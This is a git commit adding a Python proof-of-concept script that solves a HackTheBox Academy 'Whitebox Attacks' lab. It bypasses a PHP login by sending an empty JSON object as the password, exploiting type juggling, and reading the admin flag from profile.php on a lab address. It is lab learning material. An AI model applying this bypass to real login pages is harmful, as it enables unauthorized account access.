047aef72131707f65d8db55007a2d6ae7b6469b0
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-08-16 14:19:24 -0400

    Create Whitebox_Attacks-Authentication_Bypass.py

---
+++ HTBAcademy: POC-Scripts/Whitebox_Attacks-Authentication_Bypass.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+
+"""
+Created this script to solve the HackTheBox Academy lab called 'Authentication Bypass' for the module called 'Whitebox Attacks'. 
+This script exploits a php type juggling to bypass the login and get access to the admin page
+"""
+
+import requests
+
+session= requests.Session()
+target= "83.136.248.74:48488"
+proxies={"http":"http://127.0.0.1:8080"}
+headers={"Content-type":"application/json"} 
+data= '{"username":"notadmin","password":{}}' #The '{}' passed to the password value is an empty array
+
+"""
+The 'notadmin' value passed to the username value is because the source code shows the following check performed:
+
+if(strpos($_SESSION['username'], 'admin') != false) {
+    $content = get_admin_info();
+   }
+
+The problem with this code is that it only checks if the $_SESSION['username'] contains the word 'admin'.  So as long as the word admin is in the username then in it will get access to the admin $content.
+"""
+
+def find_secret(response):
+    for line in response.text.splitlines():
+        if "success" in line.lower() or "HTB{" in line.upper():
+            print(line)
+            break
+        else:
+            pass
+            
+# function to perform php type juggling to bypass login
+def php_type_juggling():
+    # bypass login
+    response= session.post(url=f"http://{target}", proxies=proxies, data=data, headers=headers)
+
+    find_secret(response)
+
+    # Get the secret flag
+    response= session.get(url=f"http://{target}/profile.php", proxies=proxies, headers=headers)
+    
+    find_secret(response)
+
+try:
+    php_type_juggling()
+except KeyboardInterrupt:
+    print("Ctrl + c detected, exiting gracefully")
